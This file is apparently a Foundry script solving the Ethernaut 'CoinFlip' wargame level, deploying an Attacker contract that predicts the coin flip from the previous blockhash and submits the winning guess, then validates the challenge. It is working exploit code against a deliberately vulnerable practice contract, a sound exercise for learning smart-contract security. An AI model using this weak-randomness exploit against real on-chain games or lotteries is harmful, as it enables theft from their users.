// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "../src/3-CoinFlip.sol";
import {CoinFlipFactory} from "../src/CoinFlipFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract CoinFlipSolution is Script {
    CoinFlip public coinFlipLevel;

    function run() external {
        address publicKey = vm.envAddress("PUBLIC_KEY");

        address payable instanceAddress = payable(
            0x8FbE40B57D28d91B57079ee6A66aae98f141919c
        );
        coinFlipLevel = CoinFlip(instanceAddress);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attacker(coinFlipLevel);
        console.log("Consecutive Wins: %s", coinFlipLevel.consecutiveWins());

        vm.stopBroadcast();

        bool isValidated = new CoinFlipFactory().validateInstance(
            instanceAddress,
            publicKey
        );
        console.log("Challenge Completed: %s", isValidated);
    }
}

contract Attacker {
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _level) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _level.flip(side);
    }
}
